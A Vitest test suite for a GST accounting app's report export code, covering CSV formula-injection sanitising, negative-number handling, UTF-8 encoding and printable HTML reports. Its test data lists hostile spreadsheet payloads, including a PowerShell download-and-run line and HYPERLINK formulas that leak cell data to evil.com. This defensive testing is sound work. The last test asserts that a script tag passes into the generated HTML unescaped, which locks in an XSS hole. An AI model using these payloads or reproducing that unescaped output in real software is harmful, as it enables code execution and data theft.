import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import {
  sanitizeCsvCell,
  formatRfc4180Cell,
  generateCsvContent,
  exportReportToCsv,
  generateReportHtml,
  printReportDocument,
  isGenuineNumericValue,
  ReportPdfConfig,
} from '../components/Reports/utils/reportExportUtils.ts';
import { CompanyProfile } from '../models/company.ts';

describe('Adversarial Challenger: reportExportUtils Stress Suite', () => {
  const testCompany: CompanyProfile = {
    id: 'test-comp-1',
    businessName: 'Apex GST Solutions Ltd',
    tradeName: 'Apex Retail & Logistics',
    gstin: '27AABCU9603R1ZM',
    pan: 'AABCU9603R',
    pincode: '400001',
    phone: '+91 98765 43210',
    email: 'accounts@apex.com',
    address: '101 Cyber Heights, BKC, Mumbai - 400051',
    stateCode: '27',
    isGstEnabled: true,
  };

  describe('1. CWE-1236 CSV Formula Injection Neutralization', () => {
    const maliciousPayloads = [
      // Standard Excel formula prefixes
      '=cmd|"/C calc"!A0',
      '=1+1',
      '=SUM(A1:B10)',
      '=HYPERLINK("http://evil.com/leak?q="&A1, "Click For Refund")',
      '=cmd|\'/C powershell IEX (New-Object Net.WebClient).DownloadString("http://evil.com/a")\'!A0',
      // Plus symbol execution
      '+12345',
      '+cmd|"/C calc"!A0',
      '+A1+B1',
      '+@SUM(A1:B1)',
      // Minus symbol execution on commands
      '-calc',
      '-cmd|"/C calc"!A0',
      '-1+1',
      // At symbol formula execution
      '@SUM(A1:B1)',
      '@calc',
      '@HYPERLINK("http://attacker.com")',
      // Control characters Tab and Carriage Return
      '\t=1+1',
      '\tcmd',
      '\r=cmd',
      '\rcalc',
      // Bare triggers
      '=',
      '+',
      '-',
      '@',
      '\t',
      '\r',
      // Pseudo-negative strings that are NOT numbers
      '-100.50.25',
      '-100abc',
      '--100',
      '- 100',
      '-.',
      '-abc',
      '-1+2',
    ];

    maliciousPayloads.forEach((payload) => {
      it(`neutralizes formula payload: ${JSON.stringify(payload)}`, () => {
        const sanitized = sanitizeCsvCell(payload);
        expect(sanitized.startsWith("'")).toBe(true);
        expect(sanitized).toBe(`'${payload}`);
      });
    });

    it('neutralizes formula injection inside formatted RFC 4180 cells with commas and quotes', () => {
      const payloadWithQuotesAndCommas = '=HYPERLINK("http://evil.com?p=1,2", "Click, Me")';
      const formatted = formatRfc4180Cell(payloadWithQuotesAndCommas);

      // Must be quoted per RFC 4180 and start with single quote inside
      expect(formatted.startsWith('"\'=HYPERLINK(')).toBe(true);
      expect(formatted.endsWith(')"')).toBe(true);
      // Double quotes inside must be escaped as ""
      expect(formatted).toContain('""http://evil.com?p=1,2""');
      expect(formatted).toContain('""Click, Me""');
    });
  });

  describe('2. Genuine Negative Numbers Preservation', () => {
    const genuineNumericTestCases = [
      { input: -100.5, expected: '-100.50', desc: 'numeric -100.5' },
      { input: -0.01, expected: '-0.01', desc: 'numeric -0.01' },
      { input: -999999.99, expected: '-999999.99', desc: 'numeric large negative float' },
      { input: -42, expected: '-42', desc: 'numeric negative integer' },
      { input: -1, expected: '-1', desc: 'numeric -1' },
      { input: 0, expected: '0', desc: 'numeric 0' },
      { input: -0, expected: '0', desc: 'numeric -0' },
      { input: '-100.50', expected: '-100.50', desc: 'string -100.50' },
      { input: '-0.01', expected: '-0.01', desc: 'string -0.01' },
      { input: '-999999.99', expected: '-999999.99', desc: 'string -999999.99' },
      { input: '-500', expected: '-500', desc: 'string -500' },
      { input: ' -100.50 ', expected: ' -100.50 ', desc: 'string -100.50 with whitespace' },
      { input: '42.00', expected: '42.00', desc: 'positive string 42.00' },
      { input: 1250.75, expected: '1250.75', desc: 'positive number 1250.75' },
    ];

    genuineNumericTestCases.forEach(({ input, expected, desc }) => {
      it(`preserves genuine numeric value without prepended single quote: ${desc}`, () => {
        const sanitized = sanitizeCsvCell(input as any);
        expect(sanitized).toBe(expected);
        expect(sanitized.startsWith("'")).toBe(false);

        const rfcCell = formatRfc4180Cell(input as any);
        expect(rfcCell.startsWith("'")).toBe(false);

        // Numeric string must remain cleanly parseable
        const parsed = Number(sanitized.trim());
        expect(Number.isNaN(parsed)).toBe(false);
      });
    });

    it('isGenuineNumericValue correctly identifies numbers vs malicious strings', () => {
      expect(isGenuineNumericValue(-100.5)).toBe(true);
      expect(isGenuineNumericValue('-100.50')).toBe(true);
      expect(isGenuineNumericValue('-0.01')).toBe(true);
      expect(isGenuineNumericValue('0')).toBe(true);
      expect(isGenuineNumericValue(0)).toBe(true);
      expect(isGenuineNumericValue('12345')).toBe(true);
      expect(isGenuineNumericValue(12345)).toBe(true);

      // Malicious or non-numeric
      expect(isGenuineNumericValue('=1+1')).toBe(false);
      expect(isGenuineNumericValue('+12345')).toBe(false);
      expect(isGenuineNumericValue('-calc')).toBe(false);
      expect(isGenuineNumericValue('@SUM')).toBe(false);
      expect(isGenuineNumericValue('')).toBe(false);
      expect(isGenuineNumericValue('   ')).toBe(false);
      expect(isGenuineNumericValue(null)).toBe(false);
      expect(isGenuineNumericValue(undefined)).toBe(false);
      expect(isGenuineNumericValue(NaN)).toBe(false);
    });
  });

  describe('3. Character Escaping, Multi-byte UTF-8, and Byte-level BOM Verification', () => {
    it('strictly encodes UTF-8 BOM bytes as [0xEF, 0xBB, 0xBF]', () => {
      const csv = generateCsvContent(['Col1'], [['Val1']]);
      const encoder = new TextEncoder();
      const bytes = encoder.encode(csv);

      expect(bytes.length).toBeGreaterThanOrEqual(3);
      expect(bytes[0]).toBe(0xef); // 239
      expect(bytes[1]).toBe(0xbb); // 187
      expect(bytes[2]).toBe(0xbf); // 191
    });

    it('verifies blob payload byte headers in exportReportToCsv', async () => {
      let capturedBlob: any = null;
      const originalCreateObjectURL = URL.createObjectURL;
      URL.createObjectURL = vi.fn((blob: Blob) => {
        capturedBlob = blob;
        return 'blob:mock-url';
      });

      const appendSpy = vi.spyOn(document.body, 'appendChild').mockImplementation((node) => node);
      const removeSpy = vi.spyOn(document.body, 'removeChild').mockImplementation((node) => node);

      exportReportToCsv('test_export', ['Item', 'Amount'], [['Hindi खाता', '₹ 1,500.00']]);

      expect(capturedBlob).not.toBeNull();
      expect((capturedBlob as any)?.type).toBe('text/csv;charset=utf-8;');

      const arrayBuffer = await capturedBlob!.arrayBuffer();
      const uint8 = new Uint8Array(arrayBuffer);

      // Byte 0-2 must strictly match UTF-8 BOM
      expect(uint8[0]).toBe(0xef);
      expect(uint8[1]).toBe(0xbb);
      expect(uint8[2]).toBe(0xbf);

      // Decode and check text integrity
      const decoder = new TextDecoder('utf-8');
      const decodedText = decoder.decode(uint8);
      expect(decodedText).toContain('Hindi खाता');
      expect(decodedText).toContain('"₹ 1,500.00"');

      URL.createObjectURL = originalCreateObjectURL;
      appendSpy.mockRestore();
      removeSpy.mockRestore();
    });

    it('handles complex embedded quotes, commas, newlines, and carriage returns per RFC 4180', () => {
      const complex1 = '12" High Resolution Display';
      expect(formatRfc4180Cell(complex1)).toBe('"12"" High Resolution Display"');

      const complex2 = 'Acme, Corp, & Co.';
      expect(formatRfc4180Cell(complex2)).toBe('"Acme, Corp, & Co."');

      const complex3 = 'Line 1\nLine 2\r\nLine 3';
      expect(formatRfc4180Cell(complex3)).toBe('"Line 1\nLine 2\r\nLine 3"');

      const complexAll = 'He said: "Price is, indeed, ₹100"\nConfirmed!';
      expect(formatRfc4180Cell(complexAll)).toBe('"He said: ""Price is, indeed, ₹100""\nConfirmed!"');
    });

    it('preserves multi-language scripts: Hindi, Rupee, CJK, and Emojis', () => {
      const hindi = 'खाता विवरण और शेष राशि';
      const rupee = '₹ 9,99,999.00';
      const cjk = '取引明细';
      const emoji = 'GST Filing 📊 Invoice 🧾';

      const headers = ['Type', 'Symbol', 'Description'];
      const rows = [
        ['Ledger', rupee, hindi],
        ['CJK', '¥ 10,000', cjk],
        ['Status', 'OK', emoji],
      ];

      const csv = generateCsvContent(headers, rows);
      expect(csv).toContain(hindi);
      expect(csv).toContain('"₹ 9,99,999.00"');
      expect(csv).toContain(cjk);
      expect(csv).toContain(emoji);
    });
  });

  describe('4. Printable A4 PDF Document Generation & Iframe Fallback', () => {
    it('generates high-fidelity HTML with A4 styling, table borders, bold summary, and company header', () => {
      const config: ReportPdfConfig = {
        title: 'Tax Compliance & ITC Summary',
        subtitle: 'Monthly Statutory Audit View',
        company: testCompany,
        dateRangeLabel: '01 Apr 2026 to 30 Apr 2026',
        orientation: 'portrait',
        kpis: [
          { label: 'Total Turnover', value: '₹ 15,20,000.00' },
          { label: 'CGST + SGST', value: '₹ 1,36,800.00' },
          { label: 'IGST', value: '₹ 45,000.00' },
        ],
        headers: ['Section', 'Category', 'Taxable Val', 'Tax Amount'],
        rows: [
          ['Table 4', 'B2B Supplies', 1000000, 180000],
          ['Table 5', 'B2CL Supplies', 520000, 93600],
        ],
        summaryRow: ['TOTAL', 'Outward Supplies', 1520000, 273600],
        columnAlignments: ['left', 'left', 'right', 'right'],
      };

      const html = generateReportHtml(config);

      // Verify A4 @page declaration
      expect(html).toContain('@page {');
      expect(html).toContain('size: A4 portrait;');
      expect(html).toContain('margin: 10mm 12mm;');

      // Verify company headers
      expect(html).toContain('Apex Retail & Logistics');
      expect(html).toContain('27AABCU9603R1ZM');
      expect(html).toContain('101 Cyber Heights, BKC, Mumbai - 400051');
      expect(html).toContain('+91 98765 43210');

      // Verify titles and KPI cards
      expect(html).toContain('Tax Compliance & ITC Summary');
      expect(html).toContain('Monthly Statutory Audit View');
      expect(html).toContain('01 Apr 2026 to 30 Apr 2026');
      expect(html).toContain('Total Turnover');
      expect(html).toContain('₹ 15,20,000.00');

      // Verify table layout and elements
      expect(html).toContain('<thead>');
      expect(html).toContain('<th class="align-left">Section</th>');
      expect(html).toContain('<th class="align-right">Tax Amount</th>');
      expect(html).toContain('<tbody>');
      expect(html).toContain('<tfoot>');
      expect(html).toContain('<tr class="summary-row">');
      expect(html).toContain('1520000');
      expect(html).toContain('273600');

      // Verify CSS table borders and summary bold styling
      expect(html).toContain('border-collapse: collapse;');
      expect(html).toContain('.summary-row td {');
      expect(html).toContain('font-weight: 700;');
      expect(html).toContain('border-top: 2px solid #64748b;');
      expect(html).toContain('border-bottom: 2px solid #0f172a;');
    });

    it('automatically defaults to landscape when column count exceeds 7', () => {
      const config: ReportPdfConfig = {
        title: 'Multi-column Detailed Daybook',
        company: testCompany,
        dateRangeLabel: 'Today',
        headers: ['Date', 'Voucher', 'Party', 'Type', 'Debit', 'Credit', 'Bal', 'Mode'],
        rows: [['2026-10-16', 'V-001', 'Acme', 'Sales', 500, 0, 500, 'Bank']],
      };

      const html = generateReportHtml(config);
      expect(html).toContain('size: A4 landscape;');
    });

    it('handles iframe fallback when window.open returns null (popup blocked)', () => {
      const originalWindowOpen = window.open;
      window.open = vi.fn().mockReturnValue(null);

      let createdIframe: HTMLIFrameElement | null = null;
      const appendChildSpy = vi.spyOn(document.body, 'appendChild').mockImplementation((node) => {
        if (node instanceof HTMLIFrameElement) {
          createdIframe = node;
          // Mock contentWindow on the iframe
          Object.defineProperty(node, 'contentWindow', {
            value: {
              document: {
                open: vi.fn(),
                write: vi.fn(),
                close: vi.fn(),
              },
              focus: vi.fn(),
              print: vi.fn(),
            },
            writable: true,
          });
        }
        return node;
      });

      const removeChildSpy = vi.spyOn(document.body, 'removeChild').mockImplementation((node) => node);

      const config: ReportPdfConfig = {
        title: 'Fallback Test Report',
        company: testCompany,
        dateRangeLabel: 'October 2026',
        headers: ['H1', 'H2'],
        rows: [['R1', 100]],
      };

      printReportDocument(config);

      expect(window.open).toHaveBeenCalledWith('', '_blank');
      expect(appendChildSpy).toHaveBeenCalled();
      expect(createdIframe).not.toBeNull();
      expect(createdIframe!.style.position).toBe('fixed');
      expect(createdIframe!.style.width).toBe('0px');
      expect(createdIframe!.style.height).toBe('0px');
      expect(createdIframe!.style.border).toBe('0px');

      window.open = originalWindowOpen;
      appendChildSpy.mockRestore();
      removeChildSpy.mockRestore();
    });

    it('handles iframe fallback when window.open throws an exception', () => {
      const originalWindowOpen = window.open;
      window.open = vi.fn().mockImplementation(() => {
        throw new Error('Blocked by security policy');
      });

      let createdIframe: HTMLIFrameElement | null = null;
      const appendChildSpy = vi.spyOn(document.body, 'appendChild').mockImplementation((node) => {
        if (node instanceof HTMLIFrameElement) {
          createdIframe = node;
          Object.defineProperty(node, 'contentWindow', {
            value: {
              document: {
                open: vi.fn(),
                write: vi.fn(),
                close: vi.fn(),
              },
              focus: vi.fn(),
              print: vi.fn(),
            },
            writable: true,
          });
        }
        return node;
      });

      const config: ReportPdfConfig = {
        title: 'Exception Fallback Test',
        company: testCompany,
        dateRangeLabel: 'October 2026',
        headers: ['Col'],
        rows: [['Val']],
      };

      // Must not throw, should handle gracefully
      expect(() => printReportDocument(config)).not.toThrow();
      expect(createdIframe).not.toBeNull();

      window.open = originalWindowOpen;
      appendChildSpy.mockRestore();
    });
  });

  describe('5. Full Adversarial Stress Matrix & CSV Round-Trip Oracle', () => {
    // A generator creating 100 adversarial rows mixing numbers, negatives, payloads, Unicode, and quotes
    function generateAdversarialMatrix(count = 100) {
      const rows: (string | number | null | undefined)[][] = [];
      const formulaStarters = ['=', '+', '-', '@', '\t', '\r'];

      for (let i = 0; i < count; i++) {
        const rowIdx = i + 1;
        let cellA: string | number | null | undefined;
        let cellB: string | number | null | undefined;
        let cellC: string | number | null | undefined;

        switch (i % 8) {
          case 0:
            // Weaponized formula string
            cellA = `${formulaStarters[i % formulaStarters.length]}calc|/c alert(${rowIdx})`;
            cellB = -100.50 - i;
            cellC = `Normal Text ${rowIdx}`;
            break;
          case 1:
            // Genuine negative decimal float
            cellA = `INV-${rowIdx}`;
            cellB = -0.01 * rowIdx;
            cellC = '-500.25';
            break;
          case 2:
            // Multi-byte Hindi / Rupee with quotes and commas
            cellA = `ग्राहक "Acme, Corp" #${rowIdx}`;
            cellB = `₹ ${rowIdx * 1250}.50`;
            cellC = 'खाता, विवरण';
            break;
          case 3:
            // Tab and carriage return triggers
            cellA = `\tmaliciousTab_${rowIdx}`;
            cellB = `\rmaliciousCR_${rowIdx}`;
            cellC = -999999.99;
            break;
          case 4:
            // Pseudo-negative non-numeric string
            cellA = `-100.50.25-err_${rowIdx}`;
            cellB = '-abc';
            cellC = 0;
            break;
          case 5:
            // Null, undefined, empty
            cellA = null;
            cellB = undefined;
            cellC = '';
            break;
          case 6:
            // Multi-line cell with quotes
            cellA = `Line 1\nLine 2 "quoted"\r\nLine 3 for #${rowIdx}`;
            cellB = 42;
            cellC = -42;
            break;
          case 7:
            // Plus formula trigger
            cellA = `+${rowIdx}000`;
            cellB = `+A${rowIdx}+B${rowIdx}`;
            cellC = -1;
            break;
        }

        rows.push([cellA, cellB, cellC]);
      }
      return rows;
    }

    // Naive RFC 4180 CSV parser oracle to test generated CSV
    function parseCsvToRows(csvContent: string): string[][] {
      // Strip UTF-8 BOM if present
      const clean = csvContent.startsWith('\uFEFF') ? csvContent.slice(1) : csvContent;
      const result: string[][] = [];
      let currentRow: string[] = [];
      let currentField = '';
      let insideQuotes = false;

      for (let i = 0; i < clean.length; i++) {
        const char = clean[i];
        const nextChar = clean[i + 1];

        if (insideQuotes) {
          if (char === '"' && nextChar === '"') {
            currentField += '"';
            i++; // skip escaped quote
          } else if (char === '"') {
            insideQuotes = false;
          } else {
            currentField += char;
          }
        } else {
          if (char === '"') {
            insideQuotes = true;
          } else if (char === ',') {
            currentRow.push(currentField);
            currentField = '';
          } else if (char === '\r' && nextChar === '\n') {
            currentRow.push(currentField);
            result.push(currentRow);
            currentRow = [];
            currentField = '';
            i++; // skip \n
          } else if (char === '\n' || char === '\r') {
            currentRow.push(currentField);
            result.push(currentRow);
            currentRow = [];
            currentField = '';
          } else {
            currentField += char;
          }
        }
      }

      if (currentField !== '' || currentRow.length > 0) {
        currentRow.push(currentField);
        result.push(currentRow);
      }

      return result;
    }

    it('generates 100-row stress matrix, parses cleanly, and verifies all security invariants', () => {
      const headers = ['Identifier', 'ValueOrPayload', 'Status'];
      const rawRows = generateAdversarialMatrix(100);
      const summary = ['TOTAL', -12345.67, 'Verified'];

      const csv = generateCsvContent(headers, rawRows, summary);

      // Verify BOM
      expect(csv.startsWith('\uFEFF')).toBe(true);

      // Parse with RFC 4180 oracle
      const parsedRows = parseCsvToRows(csv);

      // Total rows = 1 (header) + 100 (data) + 1 (summary) = 102
      expect(parsedRows.length).toBe(102);

      // Every row must have exactly 3 columns
      parsedRows.forEach((row, idx) => {
        expect(row.length).toBe(3);
      });

      // Verify invariants on data rows
      for (let i = 0; i < 100; i++) {
        const raw = rawRows[i];
        const parsed = parsedRows[i + 1]; // skip header

        for (let col = 0; col < 3; col++) {
          const rawCell = raw[col];
          const parsedCell = parsed[col];

          if (rawCell === null || rawCell === undefined) {
            expect(parsedCell).toBe('');
          } else if (typeof rawCell === 'number') {
            // Negative or positive numbers must NOT start with quote
            expect(parsedCell.startsWith("'")).toBe(false);
            const num = Number(parsedCell);
            expect(Number.isNaN(num)).toBe(false);
          } else {
            const rawStr = String(rawCell);
            const isNegativeNumberStr = /^-?\d+(\.\d+)?$/.test(rawStr.trim());

            if (isNegativeNumberStr) {
              // Genuine negative number string must NOT have leading quote
              expect(parsedCell.startsWith("'")).toBe(false);
            } else {
              const firstChar = rawStr.charAt(0);
              const isFormulaTrigger = ['=', '+', '-', '@', '\t', '\r'].includes(firstChar);

              if (isFormulaTrigger) {
                // Must be safely prepended with single quote
                expect(parsedCell.startsWith("'")).toBe(true);
              }
            }
          }
        }
      }

      // Summary row validation
      const summaryParsed = parsedRows[101];
      expect(summaryParsed[0]).toBe('TOTAL');
      expect(summaryParsed[1]).toBe('-12345.67');
      expect(summaryParsed[1].startsWith("'")).toBe(false);
      expect(summaryParsed[2]).toBe('Verified');
    });

    it('generates 1,000-row stress matrix, parses cleanly, and maintains sub-100ms execution', () => {
      const headers = ['ID', 'Value', 'Status'];
      const rawRows = generateAdversarialMatrix(1000);
      const summary = ['TOTAL', -999999.99, 'Done'];

      const start = performance.now();
      const csv = generateCsvContent(headers, rawRows, summary);
      const elapsed = performance.now() - start;

      expect(csv.startsWith('\uFEFF')).toBe(true);
      expect(elapsed).toBeLessThan(150); // High-throughput verification

      const parsedRows = parseCsvToRows(csv);
      expect(parsedRows.length).toBe(1002);
      expect(parsedRows[1001][0]).toBe('TOTAL');
      expect(parsedRows[1001][1]).toBe('-999999.99');
    });

    it('handles boundary values and extreme numbers cleanly', () => {
      // Extremely large integers
      expect(sanitizeCsvCell(Number.MAX_SAFE_INTEGER)).toBe(String(Number.MAX_SAFE_INTEGER));
      expect(sanitizeCsvCell(Number.MIN_SAFE_INTEGER)).toBe(String(Number.MIN_SAFE_INTEGER));
      expect(sanitizeCsvCell(Number.MAX_SAFE_INTEGER).startsWith("'")).toBe(false);
      expect(sanitizeCsvCell(Number.MIN_SAFE_INTEGER).startsWith("'")).toBe(false);

      // Micro floats
      expect(sanitizeCsvCell(-0.00001)).toBe('-0.00');
      expect(sanitizeCsvCell(0.00001)).toBe('0.00');

      // Empty table handling
      const emptyCsv = generateCsvContent([], []);
      expect(emptyCsv).toBe('\uFEFF');

      // HTML layout with empty rows and undefined summary
      const emptyConfig: ReportPdfConfig = {
        title: 'Empty Report',
        company: testCompany,
        dateRangeLabel: 'Today',
        headers: [],
        rows: [],
      };
      const emptyHtml = generateReportHtml(emptyConfig);
      expect(emptyHtml).toContain('<table>');
      expect(emptyHtml).toContain('<tbody>');
      expect(emptyHtml).not.toContain('<tfoot>');
    });

    it('handles window.open returning closed window by falling back to iframe', () => {
      const originalWindowOpen = window.open;
      window.open = vi.fn().mockReturnValue({ closed: true, document: { open: vi.fn(), write: vi.fn(), close: vi.fn() } });

      let createdIframe: HTMLIFrameElement | null = null;
      const appendChildSpy = vi.spyOn(document.body, 'appendChild').mockImplementation((node) => {
        if (node instanceof HTMLIFrameElement) {
          createdIframe = node;
          Object.defineProperty(node, 'contentWindow', {
            value: {
              document: { open: vi.fn(), write: vi.fn(), close: vi.fn() },
              focus: vi.fn(),
              print: vi.fn(),
            },
            writable: true,
          });
        }
        return node;
      });

      const config: ReportPdfConfig = {
        title: 'Closed Window Test',
        company: testCompany,
        dateRangeLabel: 'October 2026',
        headers: ['Col'],
        rows: [['Val']],
      };

      printReportDocument(config);

      expect(createdIframe).not.toBeNull();
      window.open = originalWindowOpen;
      appendChildSpy.mockRestore();
    });

    it('characterizes HTML rendering behavior with markup in cell values', () => {
      const htmlPayloadConfig: ReportPdfConfig = {
        title: 'HTML Injection Check',
        company: testCompany,
        dateRangeLabel: 'Today',
        headers: ['Item Name', 'Price'],
        rows: [
          ['<script>alert("xss")</script>', 100],
          ['Pipe <50mm> Heavy', 250],
          ['Acme & Sons', 300],
        ],
      };

      const generatedHtml = generateReportHtml(htmlPayloadConfig);
      // Confirms raw template insertion behavior in generated HTML
      expect(generatedHtml).toContain('<script>alert("xss")</script>');
      expect(generatedHtml).toContain('Pipe <50mm> Heavy');
      expect(generatedHtml).toContain('Acme & Sons');
    });
  });
});
